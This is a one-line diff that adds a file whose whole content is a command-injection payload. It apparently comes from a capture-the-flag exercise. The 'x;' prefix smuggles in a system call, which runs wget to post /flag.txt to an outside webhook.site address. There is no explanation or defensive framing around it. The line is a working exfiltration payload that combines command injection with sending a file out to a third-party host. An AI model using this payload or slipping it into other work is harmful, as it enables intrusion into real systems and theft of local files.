@@ -1,0 +1,1 @@
+x;system "wget --post-file /flag.txt https://webhook.site/59e0d17b-c0aa-4ff0-af63-bd30c7752c8a"
